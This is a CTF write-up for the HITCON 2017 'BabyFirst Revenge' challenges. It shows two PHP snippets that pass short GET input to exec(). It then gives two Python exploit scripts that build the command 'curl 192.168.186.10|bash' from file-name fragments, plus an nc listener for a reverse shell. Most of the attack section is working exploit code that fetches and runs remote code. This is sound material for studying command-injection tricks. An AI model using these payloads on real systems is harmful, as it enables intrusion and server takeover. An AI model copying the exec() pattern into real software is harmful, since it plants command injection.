# Challenge 1
```php 
 <?php
    $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 5) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__);


```

# Challenge 2
```php 
 <?php
    $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 4) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__);
```

# Solution

EXP

```python
import requests
from time import sleep

payload = [
        # `ls -t>g`
        '>ls\\',
        'ls>_',
        '>\ \\',
        '>-t\\',
        '>\>g',
        'ls>>_',

        # `curl 192.168.186.10|bash`
        '>sh\ ',
        '>ba\\',
        '>\|\\',
        '>10\\',
        '>6.\\',
        '>18\\',
        '>8.\\',
        '>16\\',
        '>2.\\',
        '>19\\',
        '>\ \\',
        '>rl\\',
        '>cu\\',

        # exec
        'sh _',
        'sh g',
]

r = requests.get('http://192.168.186.10/60.php?reset=1')
for i in payload:
    r = requests.get('http://192.168.186.10/60.php?cmd=' + i)
    print i
    sleep(0.2)
```

用 nc -lvvp 12345 接收反弹shell



2

```python
import requests
import time
url = "http://192.168.186.10/602.php"

payload = [
        ">dir",
        ">sl",
        ">g\>",
        ">ht-",
        "*>v",
        ">rev",
        "*v>x", # ls -th>g
        ">sh",
        ">ba\\",
        ">\|\\",
        ">10\\",
        ">6.\\",
        ">18\\",
        ">8.\\",
        ">16\\",
        ">2.\\",
        ">19\\",
        ">\ \\",
        ">rl\\",
        ">cu\\",
        "sh x",
        "sh g"
        ]

r = requests.get(url+"?reset=1")
for i in payload:
    print i
    time.sleep(0.5)
    r = requests.get(url + "?cmd=" + i)
```



# Refference 

+ hitcon ctf 2017  BabyFirst Revenge
+ hitcon ctf 2017  BabyFirst Revenge2
+ https://mengsec.com/2018/10/31/HITCON-2017-babyfirst-revenge-v1-v2/
+ https://www.jianshu.com/p/a77e956d9941